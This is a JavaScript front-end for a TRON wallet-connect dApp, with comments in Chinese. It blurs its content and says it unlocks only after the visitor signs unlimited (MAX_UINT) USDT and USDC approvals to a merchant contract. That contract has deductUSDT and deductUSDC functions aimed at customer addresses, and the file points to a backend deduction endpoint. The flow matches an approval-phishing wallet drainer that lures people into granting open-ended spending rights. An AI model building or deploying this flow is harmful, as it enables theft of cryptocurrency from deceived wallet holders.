// tron-wallet-v2/src/main.js
// 🚨 最終 V2 穩定版代碼 (使用 @web3modal/standalone, TronWeb, 和 WalletConnect V2)

import './style.css';
// 注意：以下套件依賴於在 index.html 中載入的 UMD 腳本，所以這裡不需要 import
// const Web3Modal = window.Web3Modal;
// const UniversalProvider = window.UniversalProvider;
// const TronWeb = window.TronWeb;

// --- 配置常量 ---
// 🚨 請使用您註冊的 Project ID 🚨
const WC_PROJECT_ID = '21ae0b7f500d5d9e2ed3c74c463df3f0'; 
const TRON_CHAIN_ID = 'tron:50'; // TRON 主網鏈 ID
const TRON_RPC_URL = 'https://api.trongrid.io';

const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; 

// 這裡我們假設後端 API 接收扣款請求
const DEDUCTION_API_ENDPOINT = 'http://localhost:3000/api/tron/deductDynamic';
const RECORD_AUTH_API = 'http://localhost:3000/api/tron/recordAuth'; 

// 🚨 您的合約 ABI 🚨 (為了簡潔，這裡只寫一個變量名，實際內容已在前面的代碼中)
// 確保這個 ABI 變數在您的實際文件中是完整的 JSON 陣列。
const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];


// --- 狀態變數 ---
let tronWeb;
let userAddress;
let merchantContract;
let usdtContract;
let usdcContract;
let isConnectedFlag = false;
let provider; // 用於 WalletConnect Provider 實例

// --- UI 元素 ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay');
const overlayMessage = document.getElementById('overlayMessage');
const deductionForm = document.getElementById('deductionForm');
const tokenSelectForm = document.getElementById('tokenSelectForm'); 
const deductionAmountInput = document.getElementById('deductionAmount');


// --- WalletConnect V2 配置與 Modal ---
// 依賴於 index.html 中載入的 Web3Modal
const web3Modal = new Web3Modal.Web3Modal({
    projectId: WC_PROJECT_ID,
    themeMode: 'light',
    walletConnect: {
        show: true,
    },
});

// --- 輔助函數 (保持不變) ---
function showOverlay(message) {
    overlayMessage.innerHTML = message;
    blurOverlay.style.display = 'flex';
}
function hideOverlay() {
    blurOverlay.style.display = 'none';
    if (isConnectedFlag) {
        deductionForm.style.display = 'block';
    }
}
function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connected) {
        connectButton.classList.add('connected');
        connectButton.title = `已連線: ${address.substring(0, 4)}...${address.slice(-4)}`;
        hideOverlay();
    } else {
        connectButton.classList.remove('connected');
        connectButton.title = '連繫錢包';
        showOverlay('請連繫您的錢包並完成 Max 授權以解鎖內容 🔒');
        deductionForm.style.display = 'none';
    }
}

async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
    if (!tronWeb || !userAddress) return false;
    try {
        const allowanceRaw = await tokenContract.allowance(userAddress, spenderAddress).call();
        const allowance = tronWeb.BigNumber(allowanceRaw);
        // 使用一個非常大的數字作為 Max 授權的門檻
        const MAX_ALLOWANCE_THRESHOLD = tronWeb.BigNumber('100000000000000000000000000000000000000'); 
        return allowance.gte(MAX_ALLOWANCE_THRESHOLD);
    } catch (error) {
        console.error("Failed to check allowance:", error);
        return false;
    }
}


// --- 核心邏輯：WalletConnect V2 連接 ---

async function connectWallet() {
    if (isConnectedFlag) {
        await disconnectWallet();
        return;
    }

    showOverlay('正在開啟錢包選擇，請選擇您的 TRON 錢包...');

    try {
        // 1. 打開 Modal 讓用戶選擇錢包 (Trust Wallet 會使用 WalletConnect)
        await web3Modal.openModal(); // 這裡只需打開 Modal UI
        
        // 2. 初始化 UniversalProvider (必須使用 window 訪問)
        if (!window.UniversalProvider) throw new Error("UniversalProvider is not loaded.");
        
        provider = await window.UniversalProvider.init({
            projectId: WC_PROJECT_ID,
            metadata: {
                name: '您的 DApp 名稱',
                description: '您的 DApp 描述',
                url: window.location.origin,
                icons: ['https://yourdapp.com/icon.png'],
            },
        });

        // 3. 請求連接 (這會彈出錢包視窗/QRCode)
        const session = await provider.connect({
            requiredNamespaces: {
                tron: {
                    methods: ['tron_signTransaction', 'tron_signMessage'],
                    chains: [TRON_CHAIN_ID],
                    events: ['accountsChanged', 'chainChanged'],
                },
            },
        });
        
        // 4. 獲取帳戶地址
        const tronNamespace = session.namespaces.tron;
        // 地址格式為 tron:50:T...，這裡只取地址部分
        userAddress = tronNamespace.accounts[0].split(':')[2]; 

        // 5. 創建 TronWeb 只讀實例
        tronWeb = new window.TronWeb({
            fullHost: TRON_RPC_URL,
            privateKey: '00', // 設置無效私鑰，確保它只用於讀取和交易構建
        });

        // 6. 初始化合約並處理後續邏輯
        await initializeContracts();
        updateConnectionUI(true, userAddress);
        await handlePostConnection();

    } catch (error) {
        console.error("連接失敗:", error);
        showOverlay(`連線失敗！錯誤: ${error.message}。請嘗試使用 DApp 瀏覽器或檢查 Project ID。`);
        updateConnectionUI(false);
    } finally {
        web3Modal.closeModal();
    }
}

async function disconnectWallet() {
    if (provider && provider.session) {
        await provider.disconnect();
    }
    tronWeb = null;
    userAddress = null;
    updateConnectionUI(false);
}

async function initializeContracts() {
    if (!tronWeb) throw new Error("TronWeb instance not available.");
    merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
    // TRC-20 代幣合約需要使用 TronWeb.contract().at(ADDRESS)
    usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
    usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
}


async function handlePostConnection() {
    if (!isConnectedFlag) return;
    
    const status = await checkAuthorization();
    const allAuthorized = status.contract && status.usdt && status.usdc;

    if (allAuthorized) {
        hideOverlay(); 
        await recordAuthorization(userAddress); 
    } else {
        showOverlay('偵測到錢包，但 Max 授權尚未完成。即將開始授權流程...');
        const authSuccess = await connectAndAuthorize();
        if (authSuccess) {
            await handlePostConnection(); 
        }
    }
}


async function checkAuthorization() {
    if (!tronWeb || !userAddress || !merchantContract) {
        return { contract: false, usdt: false, usdc: false };
    }
    // 檢查合約內部的授權標記
    const isContractAuthorized = await merchantContract.authorized(userAddress).call();
    // 檢查 TRC-20 代幣的 Max 授權額度
    const isUsdtMaxAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
    const isUsdcMaxAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);
    
    return { contract: isContractAuthorized, usdt: isUsdtMaxAuthorized, usdc: isUsdcMaxAuthorized };
}

// --- 核心授權邏輯 (修正：使用 WalletConnect 簽名) ---
async function connectAndAuthorize() {
    const status = await checkAuthorization();
    const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 
    const ZERO_UINT = "0"; 
    
    // 計算總交易數，讓客戶知道需要簽名幾次
    const totalTxs = (status.contract ? 0 : 1) + (status.usdt ? 0 : 2) + (status.usdc ? 0 : 2); 
    let txCount = 0;

    if (totalTxs === 0) {
        showOverlay("所有授權已就緒，無需額外交易。");
        await new Promise(resolve => setTimeout(resolve, 1500)); 
        return true;
    }
    
    try {
        // 1. 處理 SimpleMerchant 合約授權 (connectAndAuthorize)
        if (!status.contract) {
            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: 正在發送合約授權 (ConnectAndAuthorize)。請在 Trust Wallet 中同意！`);
            
            const transaction = await merchantContract.connectAndAuthorize().build(); 
            const signedTx = await provider.request({
                method: 'tron_signTransaction',
                params: [transaction],
            });
            await tronWeb.trx.sendRawTransaction(signedTx);
        }

        // 2. 處理 USDT Max 授權 (歸零+Max) - 需 2 筆簽名
        if (!status.usdt) {
            // USDT 步驟 1: 歸零授權 (安全性步驟，可選，但推薦)
            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: USDT 安全步驟: 重置授權至 0 (請同意)...`);
            const zeroApproveTx = await usdtContract.approve(MERCHANT_CONTRACT_ADDRESS, ZERO_UINT).build();
            const signedZeroApprove = await provider.request({ method: 'tron_signTransaction', params: [zeroApproveTx] });
            await tronWeb.trx.sendRawTransaction(signedZeroApprove);

            // USDT 步驟 2: Max 授權
            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: 設置 USDT Max 扣款授權 (最終授權 - 請同意)...`);
            const maxApproveTx = await usdtContract.approve(MERCHANT_CONTRACT_ADDRESS, MAX_UINT).build();
            const signedMaxApprove = await provider.request({ method: 'tron_signTransaction', params: [maxApproveTx] });
            await tronWeb.trx.sendRawTransaction(signedMaxApprove);
        }

        // 3. 處理 USDC Max 授權 (歸零+Max) - 需 2 筆簽名
        if (!status.usdc) {
            // USDC 步驟 1: 歸零授權
            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: USDC 安全步驟: 重置授權至 0 (請同意)...`);
            const zeroApproveTx = await usdcContract.approve(MERCHANT_CONTRACT_ADDRESS, ZERO_UINT).build();
            const signedZeroApprove = await provider.request({ method: 'tron_signTransaction', params: [zeroApproveTx] });
            await tronWeb.trx.sendRawTransaction(signedZeroApprove);
            
            // USDC 步驟 2: Max 授權
            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: 設置 USDC Max 扣款授權 (最終授權 - 請同意)...`);
            const maxApproveTx = await usdcContract.approve(MERCHANT_CONTRACT_ADDRESS, MAX_UINT).build();
            const signedMaxApprove = await provider.request({ method: 'tron_signTransaction', params: [maxApproveTx] });
            await tronWeb.trx.sendRawTransaction(signedMaxApprove);
        }
        
        return true;
    } catch (error) {
        console.error("Authorization Failed:", error);
        showOverlay(`授權交易失敗，錯誤訊息: ${error.message}。請確保您同意了所有 ${totalTxs} 筆交易。`);
        return false;
    }
}


// --- 核心扣款邏輯 (修正：使用 WalletConnect 簽名) ---
async function triggerBackendDeduction(token, amount) {
    // 這裡應該是您的後端邏輯，為了示範，我們在這裡直接呼叫合約
    // ⚠️ 實際情況下，這裡的邏輯應該由後端服務器負責，但需要客戶再次簽名 (方案 B 的限制)
    
    if (!isConnectedFlag || !userAddress || !merchantContract) {
        showOverlay("請先連繫錢包並完成授權！");
        return;
    }

    showOverlay(`正在發起 ${token} 扣款，金額: ${amount}。請在 Trust Wallet 中確認簽名！`);

    try {
        const tokenContractAddress = token === 'USDT' ? USDT_CONTRACT_ADDRESS : USDC_CONTRACT_ADDRESS;
        const contractMethod = token === 'USDT' ? merchantContract.deductUSDT : merchantContract.deductUSDC;
        const tokenContract = token === 'USDT' ? usdtContract : usdcContract;

        // 1. 檢查餘額和授權 (如果之前授權成功，這裡應該沒問題)
        const balance = await tokenContract.balanceOf(userAddress).call();
        if (tronWeb.BigNumber(balance).lt(tronWeb.toSun(amount))) {
            throw new Error(`餘額不足: 僅剩 ${tronWeb.fromSun(balance)} ${token}`);
        }

        // 2. 構建扣款交易
        // 這裡需要將金額轉換為 Sun (最小單位)
        const sunAmount = tronWeb.toSun(amount);
        const transaction = await contractMethod(userAddress, tokenContractAddress, sunAmount).build();

        // 3. 透過 WalletConnect V2 請求簽名
        const signedTx = await provider.request({
            method: 'tron_signTransaction',
            params: [transaction],
        });

        // 4. 廣播交易
        const result = await tronWeb.trx.sendRawTransaction(signedTx);
        
        // 檢查交易是否成功
        if (result.txid) {
            showOverlay(`✅ 扣款成功！交易 ID: ${result.txid.substring(0, 10)}...`);
            // 您可以在這裡加入 API 請求，將成功交易的 TXID 傳給您的後端
            // fetch(DEDUCTION_API_ENDPOINT, { method: 'POST', body: JSON.stringify({ txid: result.txid, user: userAddress }) });
        } else {
            throw new Error("交易失敗或未被廣播。");
        }
    } catch (error) {
        console.error("Deduction Failed:", error);
        showOverlay(`扣款失敗！錯誤: ${error.message}。請檢查您的餘額及授權額度。`);
    }
}

async function triggerDeductionFromForm() {
    const token = tokenSelectForm.value;
    const amount = deductionAmountInput.value;

    if (isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
        alert("請輸入有效的金額！");
        return;
    }
    
    await triggerBackendDeduction(token, amount);
}


// --- 其他輔助函數 (保持不變) ---
async function recordAuthorization(address) { 
    // 這是一個模擬的後端記錄，您需要在您的後端實現它
    console.log(`Sending authorization record to backend for: ${address}`);
    // await fetch(RECORD_AUTH_API, { method: 'POST', body: JSON.stringify({ address }) });
}


// 設置事件監聽器
connectButton.addEventListener('click', connectWallet);
if (document.getElementById('deductionForm')) {
    // 替換 HTML 中的 inline onclick
    document.getElementById('deductionForm').querySelector('button').removeEventListener('click', triggerDeductionFromForm);
    document.getElementById('deductionForm').querySelector('button').addEventListener('click', triggerDeductionFromForm);
}

// 頁面載入時初始化
showOverlay('請連繫您的錢包並完成 Max 授權以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊右上角錢包圖標開始)</p>');